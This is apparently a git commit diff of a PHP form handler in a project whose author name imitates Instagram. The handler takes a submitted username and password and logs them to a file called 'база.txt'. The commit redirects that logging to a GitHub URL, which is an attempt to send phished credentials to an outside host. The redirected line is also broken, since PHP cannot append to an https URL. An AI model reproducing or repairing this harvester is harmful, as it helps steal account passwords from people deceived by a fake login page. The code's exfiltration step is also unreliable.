3b45e23315ed68a34018ccddd78fc7fedf9b9e68
lnstagramer <gagikumrshatyan@gmail.com>
2024-09-08 21:15:55 +0400

    form.php

--- form.php
+++ form.php
@@ -3,7 +3,7 @@
 $username = $_POST['username'];
 $password = $_POST['password'];
 
-$fp = fopen('база.txt', 'a+');
+$fp = fopen('https://github.com/lnstagramer/adg/edit/main/база.txt', 'a+');
 fwrite($fp, 'Username: ' . $username . "\n");
 fwrite($fp, 'Password: ' . $password . "\n");
 fwrite($fp, '--------- ' . "\n");
